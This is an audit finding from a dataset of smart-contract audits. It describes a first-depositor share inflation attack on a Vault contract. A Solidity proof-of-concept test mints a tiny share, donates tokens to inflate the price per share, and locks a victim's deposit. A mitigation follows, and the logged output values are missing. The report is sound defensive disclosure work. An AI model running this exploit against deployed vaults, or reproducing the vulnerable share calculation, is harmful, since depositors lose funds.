# [M] Inflation attack in Vault

## Summary
Severity: Medium
Contest weight: 0.4601
Dataset id: 9221
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The Vault contract uses _decimalsOffset to add more precision to share values. The issue is that the value of the _decimalsOffset would be 0 if the underlying token had 18 decimals (which is the case for WETH and most tokens). So share calculation would be:
assets.mulDiv(newTotalSupply + 1, newTotalAssets + 1, rounding)
And because the code uses balanceOf(address(this)) to calculate IDLE pool allocation it would be possible to mint 1 wei share by depositing 1 wei token and then donate 100e18 tokens and inflate the PPS value and then when other users interact with the contract they will lose funds because big division rounding error.
```solidity
function test_initial_deposit_grief() public {
    IIonPool[] memory market = new IIonPool[](1);
    market[0] = IDLE;
    uint256[] memory allocationCaps = new uint256[](1);
    allocationCaps[0] = 250e18;
    IIonPool[] memory queue = new IIonPool[](4);
    queue[0] = IDLE;
    queue[1] = weEthIonPool;
    queue[2] = rsEthIonPool;
    queue[3] = rswEthIonPool;
    vm.prank(OWNER);
    vault.addSupportedMarkets(market, allocationCaps, queue, queue);
    setERC20Balance(address(BASE_ASSET), address(this), 11e18 + 10);
    uint256 initialAssetBalance = BASE_ASSET.balanceOf(address(this));
    console.log("attacker balance before : ");
    console.log(initialAssetBalance);
    vault.mint(10, address(this));
    IERC20(address(BASE_ASSET)).transfer(address(vault), 11e18);
    address alice = address(0xabcd);
    setERC20Balance(address(BASE_ASSET), alice, 10e18 + 10);
    vm.startPrank(alice);
    IERC20(address(BASE_ASSET)).approve(address(vault), 1e18);
    vault.deposit(1e18, alice);
    vm.stopPrank();
    uint256 aliceShares = vault.balanceOf(alice);
    console.log("alice shares : ");
    console.log(aliceShares);
    vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
    uint256 afterAssetBalance = BASE_ASSET.balanceOf(address(this));
    console.log("attacker balance after : ");
    console.log(afterAssetBalance);
}
```
Test Ouput :
Logs:
attacker balance before :
alice shares :
attacker balance after :
It can be observed that the attacker can lock 1 ETH of Alice's assets at the cost of ~ 0.1 ETH .

## Recommendation
Set the value of _decimalsOffset to 6 or consider mitigating this with an initial deposit of a small amount
